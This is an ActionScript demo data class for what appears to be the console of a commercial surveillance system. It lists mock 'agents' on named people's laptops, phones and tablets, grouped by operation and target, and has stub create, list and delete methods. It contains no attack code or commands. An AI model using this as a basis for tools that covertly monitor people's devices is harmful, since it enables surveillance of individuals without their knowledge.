package it.ht.rcs.console.agent.rest
{
  import it.ht.rcs.console.agent.model.Agent;
  import it.ht.rcs.console.factory.model.Config;
  import it.ht.rcs.console.operation.model.Operation;
  import it.ht.rcs.console.operation.model.Stat;
  import it.ht.rcs.console.target.model.Target;
  
  import mx.collections.ArrayCollection;
  import mx.rpc.events.ResultEvent;

  public class DBAgentDemo implements IDBAgent
  {
    
    public static var agents:ArrayCollection = new ArrayCollection([
        // John Doe (SwordFish)
        new Agent({ _id:"4e26a406963d350eb1000003",  _kind:"agent",  desc:"John's Laptop",                name: "Laptop (1)",        version: 10,  ident:"RCS_0000000001",  counter: 1,  path :["4df7246d963d350964000001", "4e2683f3963d350658000001"],  status: "closed",  upgradable: false,  stat: new Stat({ _id:"4e26a406963d350eb1000002", last_sync: 1307515166, evidence: {}, grid_size: 0, size: 0 }) }),
        new Agent({ _id:"4e26a6f9963d350f4e000001",  _kind:"agent",  desc:"John's Android Mobile",        name: "Mobile (1)",        version: 10,  ident:"RCS_0000000002",  counter: 1,  path :["4df7246d963d350964000001", "4e2683f3963d350658000001"],  status: "open",    upgradable: false,  stat: new Stat({ _id:"4e26a745963d350f4e000003", last_sync: 1307524166, evidence: {}, grid_size: 0, size: 0 }) }),
        // Alejandro Reade (Swordfish)
        new Agent({ _id:"4e26a712963d350f4e000002",  _kind:"agent",  desc:"Alejandro's Windows Desktop",  name: "Desktop (1)",       version: 10,  ident:"RCS_0000000003",  counter: 1,  path :["4df7246d963d350964000001", "4e2686e1963d350658000002"],  status: "open",    upgradable: false,  stat: new Stat({ _id:"4e26a87a963d350f4e00000a", last_sync: 1307614166, evidence: {}, grid_size: 0, size: 0 }) }),
        // Joey Fargo (SwordFish)
        new Agent({ _id:"4e26a843963d350f4e000004",  _kind:"agent",  desc:"Joey's Mac",                   name: "Joey mac (1)",      version: 10,  ident:"RCS_0000000004",  counter: 1,  path :["4df7246d963d350964000001", "4e268719963d350658000003"],  status: "open",    upgradable: false,  stat: new Stat({ _id:"4e26a884963d350f4e00000b", last_sync: 1308514166, evidence: {}, grid_size: 0, size: 0 }) }),
        new Agent({ _id:"4e26a84a963d350f4e000005",  _kind:"agent",  desc:"Joey's PC",                    name: "Joey pc (1)",       version: 10,  ident:"RCS_0000000004",  counter: 2,  path :["4df7246d963d350964000001", "4e268719963d350658000003"],  status: "closed",  upgradable: false,  stat: new Stat({ _id:"4e26a889963d350f4e00000c", last_sync: 1307512166, evidence: {}, grid_size: 0, size: 0 }) }),
        new Agent({ _id:"4e26a850963d350f4e000006",  _kind:"agent",  desc:"Joey's Mobile",                name: "Joey mob (1)",      version: 10,  ident:"RCS_0000000005",  counter: 3,  path :["4df7246d963d350964000001", "4e268719963d350658000003"],  status: "open",    upgradable: false,  stat: new Stat({ _id:"4e26a890963d350f4e00000d", last_sync: 1307514166, evidence: {}, grid_size: 0, size: 0,
                                                                                                                                                                                                                                                                                                                                                  source: "1.2.3.4",     user: "Joey", device: "スパイ" }) }),
        // Guido (BlackJack)
        new Agent({ _id:"4e26a857963d350f4e000007",  _kind:"agent",  desc:"Guido's PC",                   name: "Guido pc (1)",      version: 10,  ident:"RCS_0000000006",  counter: 1,  path :["4e259fe5963d35425c000001", "4e268724963d350658000004"],  status: "open",    upgradable: false,  stat: new Stat({ _id:"4e26a895963d350f4e00000e", last_sync: 1305514166, evidence: {}, grid_size: 0, size: 0 }) }),
        new Agent({ _id:"4e26a85d963d350f4e000008",  _kind:"agent",  desc:"Guido's iPad",                 name: "Guido ipad (1)",    version: 10,  ident:"RCS_0000000007",  counter: 1,  path :["4e259fe5963d35425c000001", "4e268724963d350658000004"],  status: "open",    upgradable: false,  stat: new Stat({ _id:"4e26a89a963d350f4e00000f", last_sync: 1308514166, evidence: {}, grid_size: 0, size: 0 }) }),
        
        // Dmitry Vitaly (All In)
        new Agent({ _id:"4e26a862963d350f4e000009",  _kind:"agent", desc:"Dmitry's Cellphone",            name: "Dimitry cell (1)",  version: 10,  ident:"RCS_0000000008",  counter: 1,  path :["4e25a173963d354260000003", "4e26872b963d350658000005"],  status: "open",    upgradable: false,  stat: new Stat({ _id:"4e26a8a0963d350f4e000010", last_sync: 1307514166, evidence: {}, grid_size: 0, size: 0 }), instance: 'a1b2c3',
                    configs: [new Config({ _id: 'c1', desc: 'First config',  sent: 1319708409, activated: 1319708409, saved: 1319708409, user: 'Tech User', config: '' }),
                              new Config({ _id: 'c2', desc: 'Second config', sent: 1319708409, activated: 1319708409, saved: 1319708409, user: 'Tech User', config: '' })] })
      ]);
    
    public function DBAgentDemo()
    {
    }
    
    public function all(onResult:Function=null, onFault:Function=null):void
    {
      if (onResult != null)
        onResult(new ResultEvent('agent.all', false, true, agents));
    }
    
    public function show(id:String, onResult:Function=null, onFault:Function=null):void
    {
    }
    
    public function create(params:Object, operation:Operation, target:Target, onResult:Function=null, onFault:Function=null):void
    {
      params._id = new Date().getTime().toString();
      
      var agent:Agent = new Agent(params);
      agent.path = [operation._id, target._id];
      agents.addItem(agent);
      
      if (onResult != null)
        onResult(new ResultEvent('agent.create', false, true, agent));
    }
    
    public function update(agent:Agent, property:Object, onResult:Function=null, onFault:Function=null):void
    {
    }
    
    public function destroy(id:String, onResult:Function=null, onFault:Function=null):void
    {
      if (onResult != null)
        onResult(new ResultEvent('agent.destroy'));
    }
    
  }
  
}